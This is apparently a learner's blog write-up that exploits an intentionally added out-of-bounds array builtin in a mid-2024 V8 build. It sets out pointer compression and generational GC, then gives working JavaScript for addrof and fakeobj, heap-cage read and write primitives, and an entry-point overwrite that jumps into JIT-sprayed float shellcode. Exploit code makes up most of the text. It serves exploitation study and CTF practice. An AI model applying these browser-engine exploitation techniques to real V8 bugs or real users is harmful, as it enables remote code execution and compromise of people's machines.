title: 【V8 0x00】Exploit an OOB bug in newer version of V8

I start learning v8 using this detailed [writeup](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) by Faith. However, that was from late 2019, and V8 has changed a lot since then. So I'll attempt to exploit the bug from the writeup on a more recent version of V8 to see how much I've learned so far.

I'll use this [commit](https://github.com/google/google-ctf/blob/main/2024/quals/pwn-heat/challenge/build.dockerfile) of v8 from ggctf heat challenge, which is a commit at Jun, 2024.

## Build args

```
is_debug=false 
dcheck_always_on=false
symbol_level=0
#v8_enable_memory_corruption_api=true
#v8_enable_backtrace = true
#v8_enable_disassembler = true
v8_enable_object_print = true
#v8_enable_verify_heap = true
```

To get documentation for a single flag:
```
gn args out.gn/x64.release/ --list=<flag>
```

- `is_debug=false`: release build
- `dcheck_always_on=false`: turn off dcheck.
- `symbol_level=0`: no symbols
- `v8_enable_object_print=true`: allow verbose `%DebugPrint`
- commented flags are the flags I commonly see but dont know what they do. 

Previously I also built v8 with `v8_enable_memory_corruption_api=true`, but I couldn't exploit it due to heap sandbox (and skill issue) (will explain in **Code execution** section) so I turned it off to keep things simple for newbie like me.
## The bug

I generated the patch so you can apply with the above v8 version. I also made a few changes to make it work with newer syntax.

Reading v8 code is hard, for now just pay attention to the changes to `builtins-array.cc` that adds a builtin function `oob()` for array, other changes are only added to make this builtin work. This is what `oob()` does:
- if number of args is greater than 2, return `undefined`. `ReadOnlyRoots(isolate).undefined_value()` means `undefined`.
- assign `Object::ToObject(isolate, args.receiver()))` to `receiver`. This line seems to get the current object.
- and cast it to `JSArray`. 
- and get the `element` array out of it. This array is used to store array values
- if number of args is 1 (such as `arr.oob()`), return `element[element->length()]`
- if number of args is 2 (such as `arr.oob(val)`), write `val` to `element[element->length()]`

So, the `oob()` builtin allows us to out-of-bound memory access by one index at the end of the array. Let's verify the bug.

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = val;
  return f64_buf[0];
}

function hex(val) {
  return "0x" + val.toString(16);
}

let arr = [1.1];
print("[+] arr's map pointer @ " + hex(ftoi(arr.oob()) & 0xffffffffn));
% DebugPrint(arr);
```

The above script tests the oob read. `arr[length]` should be `arr`'s map

```
[+] arr's map pointer @ 0x18cd45
DebugPrint: 0x1bec000486a1: [JSArray]
 - map: 0x1bec0018cd45 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1bec0018c69d <JSArray[0]>
 - elements: 0x1bec00048691 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
...
```

as we can see in arr's element:
![](https://i.imgur.com/nGFNo6l.png)

Next, there's oob write: 
```
d8> arr.oob(itof(0xdeadbeefcafebaben))
undefined
pwndbg> cc 0x352700048691-1 # arr's element

```

Faith's writeup has covered pointer tagging, object structure, map, and a basic v8 exploit flow: 
- `addrof` & `fakeobj` via the OOB bug 
- `arb_read` & `arb_write` via `ArrayBuffer`'s backing store 
- create a rwx wasm instance
- write arbitrary code into it and execute. 

Therefore, I won't go over everything again. Now, let me introduce a new v8's mechanism to see how it changes the exploit flow.
## Pointer compression

**Pointer compression** is a new mechanism in V8 designed to reduce memory consumption. The V8 heap region is 4GB in size, with all addresses in this region sharing the same upper 32 bits. To optimize this, V8 stores the base address separately and uses offsets as pointers, reducing the pointer size from 64 bits to 32 bits. You can read more about it [here](https://v8.dev/blog/pointer-compression) and [here](https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html).

```
Before:
            |----- 32 bits -----|----- 32 bits -----|
Pointer:    |________________address______________**w1**|
Smi:        |____int32_value____|000000000000000000**0**|

After:
                    |----- 32 bits -----|----- 32 bits -----|
Compressed pointer:                     |______offset_____w1|
Compressed Smi:                         |____int31_value___0|
```

How does this affect exploitation? We can no longer access data outside the heap, as the compiler adds the pointers to a base address (`cage_base`) before processing. This means arbitrary read and write are no longer possible, putting an end to the whole shellcode write & execute in wasm's rwx region strategy.

Luckily, here's the new exploit strategy I've learn from several writeups (refs bellow):
- achieve `addrof` & `fakeobj`. ~~`fakeobj` is not reliable (?) as it can easily cause v8 to crash (see the **Mysterious crashes** section).~~
- achieve `cage_read` & `cage_write`: "arbitrarily" read & write within the 4gb heap region (the **cage**) is still possible.
- trigger Turbofan optimization on a function with an array containing our shellcode to prepare for code execution (or shortly called JIT spraying). I'll cover it later.
- modify code's entry point of the optimized function to jump to our shellcode

## addrof & fakeobj

`addrof` is harder to achieved in this version. In Faith's writeup, regardless of float array or object array, `array[length]` will always the array's map. Then we can fool an object array of thinking it were a float array by overwriting its map, thus achieving the `addrof` primitive.

But in the newer version of V8, object array's layout looks like this:
```js
let obj_arr = [{}];
```
![](https://i.imgur.com/hj2iDHf.png)

Yellow is obj_arr's struct, orange is obj_arr's element and red is the empty object. As you can see, `obj_arr[length]` is now the map of empty object instead of the map of the object array, which is useless for implementing `addrof`.

But there's still a way to reorganize those objects as we want thanks to the **Minor GC** process.

### Generational heap layout

To better manage heap space by separating the size, frequency of use, and purpose of objects, the heap in V8 are divided into several areas, including **New space** and **Old space**. More on [this](https://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection).
- **New space**: New objects are allocated here. New space is small and is designed to be garbage collected (minor GC-ed, will cover later) very quickly.
- **Old space**: Objects that survived 2 minor GCs are moved here.

These 2 spaces involve in minor GC, so what is minor GC? In the vast majority of programs, objects tend to die young: most objects have a very short lifetime. To take advantage of this behavior, V8 divides (part of) the heap into two **generations**.

There is a **young generation** (split further into **nursery** and **intermediate** sub-generations), and an **old generation**. As you can guess, young generation is the new space, and old generation is the old space. 

Objects are first allocated into the nursery. If they survive the next GC, they remain in the young generation but are considered intermediate (marked by a circle). 
![img](https://v8.dev/_img/trash-talk/03.svg)

If they survive yet another GC, they are moved into the old generation.
![img](https://v8.dev/_img/trash-talk/04.svg)

Moreover, objects are moved from new to old space using an algorithm called **Scavenge** (more on  [this](https://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection)). Basically, objects are tracked as a tree, with first order parents are global objects and children are other objects that parents point to. When Scavenge is triggered, the parents are moved first, followed by the children. Think of it like BFS.  

Finally, minor GC will occur if the nursery runs out of memory.
### Implement addrof & fakeobj

We can make use of how scavenger work like this:
```js
function gc() {
  for (var i = 0; i < 0x10000; ++i)
    var a = new ArrayBuffer();
}

gc();
var float_arr = [1.1];
gc();
var obj_arr = [{}];
gc();
```

 `gc()` function is used to trigger minor GC, and it allocates enough memory to trigger minor gc (at least) twice, so all survived objects are moved will be moved to Old space after `gc()`.

Use the first `gc()` to clean up new space. Then allocate a float array and call the second `gc()`. There are only 2 objects are moved during this scavanging: float array struct and its element. Finally allocate object array and call the last `gc()`, the object array struct are moved first and are moved to just under float array's element.

![](https://i.imgur.com/xAhAsvh.png)

You can debug to see that object array's struct (yellow) are moved bellow float array's element (orange)
![](https://i.imgur.com/kieuOKV.png)

At this point we can leak object array map and implement `addrof`

```js
var float_arr0 = [1.1];
var float_arr_map = ftoi(float_arr0.oob()) & 0xffffffffn;
print("[+] float_arr_map @ " + hex(float_arr_map));
gc();
var float_arr = [1.1];
gc();
var obj_arr = [{}];
gc();
var obj_arr_map = ftoi(float_arr.oob()) & 0xffffffffn;
print("[+] obj_arr_map @ " + hex(obj_arr_map));


function addrof(obj) {
  obj_arr[0] = obj;
  float_arr.oob(itof(float_arr_map));
  let val = ftoi(obj_arr[0]) & 0xffffffffn
  // restore map
  float_arr.oob(itof(obj_arr_map));
  return val;
}

let test = 'cc';
print("[+] test @ " + hex(addrof(test)));
%DebugPrint(test);
```

```
[+] float_arr_map @ 0x18cd45
[+] obj_arr_map @ 0x18cdc5
[+] test @ 0x1985f1
DebugPrint: 0x14cf001985f1: [String] in OldSpace: #cc
```

`fakeobj` is the reverse of `addrof`:
```js
function fakeobj(addr) {
  float_arr.oob(itof(float_arr_map));
  obj_arr[0] = itof(addr);
  // restore map
  float_arr.oob(itof(obj_arr_map));
  return obj_arr[0];
}
```

### Failed to implement fakeobj

The above `fakeobj` would failed because our value cant be written to `obj_arr[0]`. 
```
d8> float_arr.oob(itof(float_arr_map))
undefined
d8> obj_arr[0] = itof(fake_holder_elem + 8n)
4.729853e-318
d8> obj_arr[0]
3.357313519157631e-308
d8> obj_arr[0] = 4.729853e-318
4.729853e-318
d8> obj_arr[0]   
3.357313519524451e-308
```

It seems that faking the map isn't sufficient to changes the assignment behavior. Looking at Faith's writeup again, we can see that he only swapped the map for element reading.

To address this, I introduced two additional float arrays. This ensures that there will be no incorrect assignments.
```js
// ...
gc();
var float_arr = [1.1];
gc();
var obj_arr = [{}];
gc();
var float_arr2 = [1.1];
gc();
var float_arr3 = [1.1];
gc();
// ...
function fakeobj(addr) {
  float_arr3[0] = itof(addr);
  float_arr2.oob(itof(obj_arr_map));
  let obj = float_arr3[0];
  // restore map
  float_arr2.oob(itof(float_arr_map));
  return obj;
}
```

## Preview of how to get code execution

We can no longer write data outside of the heap, but writing shellcode problem is still feasible through Turbofan function optimization.

Javascript is a dynamic type language, which means when you call a function, the engine has to looks up information about object types at runtime. If the function is called so many times, it will be considered **hot** and Turbofan JIT compiler will generate an optimized version of that function with the specified types information.

For example, if you call a function the first time and check its struct:
```js
function foo() {
  return [-1.1885958788264018e+148]; // 0xdeadbeefcafebafe
}
foo();
%DebugPrint(foo);
```

you'll see its code here is of type `Code BUILTIN InterpreterEntryTrampoline`, which means it has to jump to a stub code to identify type information.

When triggered, Turbofan compiles immediate numbers (such as floats) into `movabs <reg>, <val>` instructions and those `<val>`s becomes our small pockets of shellcode. I learn this trick from [this](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) and [this](https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/) and [this](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html). The last thing we need to do is to modify the function's entrypoint so it will jump to `<val>` when called. Therefore we need some primitives to arbitrarily read & write within the heap region, or the "cage". 

### idkwhy

If I don't put value inside an array, Turbofan will not compile code into `movabs <reg>, <val>` :
```js
function foo() {
  return -1.1885958788264018e+148;
}
// or 
function foo() {
  let a = -1.1885958788264018e+148;
  return a;
}
// wont work
```
 
## cage_read & cage_write

In order to cage read & write, we need an object with a float array map that allows us to controll its elements, so we can leak the value at `*(element + 8)`.

```js
let fake_holder = [itof(float_arr_map), 1.1, 1.2]; // holds the fake object. 
let fake = fakeobj(addrof(fake_holder) + 0x20n);

function cage_read(addr) {
  fake_holder[1] = itof(addr - 8n + 1n + 0x200000000n); // + 0x200000000n to set array length to 1
  return ftoi(fake[0]);
}

function cage_write(addr, val) {
  fake_holder[1] = itof(addr - 8n + 1n + 0x200000000n); // + 0x200000000n to set array length to 1
  fake[0] = itof(val);
}
```

## Code execution

As I explained earlier, I need to modify the function's entry point to jump to the middle of immediate numbers, where my shellcode pocket is located, in order to achieve code execution. The entry point is found at `function->code->instruction_start`.

However, an unexpected situation happened as I couldn't find the `code` field inside the function. Additionally, in my build, the `code` is located in a different region from the heap cage, as shown bellow:

This situation is different from all the writeups I read, where the `code` is in the same region as heap object and they can easily get the `code` at `function+0x10` or `function+0x8`.

I believe that if `%DebugPrint` can dump fields, there must be a way to calculate `code`. So, I followed the source code of `%DebugPrint` and ended up [here](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/diagnostics/objects-printer.cc;drc=10c26d0d230900f91d239f2fe0b731b054127e89;l=2179). There, you can see that the `code` field is treated differently from fields like `shared_info` and `name` as a mysterious `isolate` is passed to calculate `code`:

Afterall, I couldn't understand much of the code. Maybe it's due to the newly introduced [heap sandbox](https://youtu.be/5otAw81AHQ0?si=hGVg5ZTcCSl0Hejc) from four months ago? Since I'm just starting to learn V8 exploitation, I don't want things getting too complicated, so I tried my luck by disabling any suspicious build arguments and rebuilding V8 to see if the issue still happen. And after disabling `v8_enable_memory_corruption_api`, the `code` go back to heap region and I can find it at `function + 12`

```js
let func_addr = addrof(foo);
let code_addr = cage_read(func_addr - 1n + 12n);
let entrypoint_addr = code_addr - 1n + 20n;
let entrypoint = cage_read(entrypoint_addr);
print("[+] func_addr @ " + hex(func_addr));
print("[+] code_addr @ " + hex(code_addr));
print("[+] entrypoint_addr @ " + hex(entrypoint_addr));
print("[+] old entrypoint @ " + hex(entrypoint));
cage_write(entrypoint_addr, entrypoint + 0x6fn);
foo()
```

```sh
$ ~/v8/out.gn/x64.release/d8 ./oob/pwn.js
